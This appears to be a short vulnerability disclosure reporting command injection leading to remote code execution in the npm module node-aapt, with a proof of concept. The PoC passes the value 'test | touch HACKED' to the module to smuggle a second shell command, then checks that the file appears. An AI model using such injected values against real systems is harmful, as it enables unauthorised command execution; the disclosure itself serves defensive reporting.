# :bug: Description

The `node-aapt` module is vulnerable against `RCE` since a command is crafted using `user inputs` not validated and then executedading to `arbitrary command injection`

# :fire: POC

1. Create the following PoC file:

```js
// poc.js
const packageInfo = require('node-aapt');
packageInfo('test | touch HACKED ', function(err){console.log()});

```
2. Check there aren't files called `HACKED` 
3. Execute the following commands in another terminal:

```bash
npm i node-aapt # Install affected module
node poc.js #  Run the PoC
```
4. Recheck the files: now `HACKED` has been created 
